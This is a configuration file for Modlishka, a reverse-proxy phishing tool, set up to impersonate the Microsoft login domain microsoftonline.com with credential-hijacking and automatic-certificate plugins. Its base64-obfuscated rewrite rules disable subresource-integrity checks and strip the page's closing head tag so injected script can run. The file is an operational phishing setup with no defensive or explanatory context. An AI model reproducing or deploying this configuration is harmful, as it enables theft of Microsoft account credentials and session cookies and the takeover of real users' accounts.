{
  "proxyDomain": "loopback.modlishka.io",
  "listeningAddress": "0.0.0.0",
  "proxyAddress": "",
  "target": "microsoftonline.com",
  "targetResources": "",
  "rules": "by5zZXRBdHRyaWJ1dGUoImludGVncml0eSI=:by5zZXRBdHRyaWJ1dGUoImludGVnZHJpdHki,aW50ZWdyaXR5PQ==:aW50ZWdyaWN0eT0=,PC9oZWFkPg==:",
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules":"",
  "jsReflectParam": "reflect",
  "debug": false,
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "logPostOnly": false,
  "disableSecurity": false,
  "log": "ms.log",
  "plugins": "autocert,hijack",
  "credParams": "",
  "cert": "",
  "certKey": "",
  "certPool": ""
}
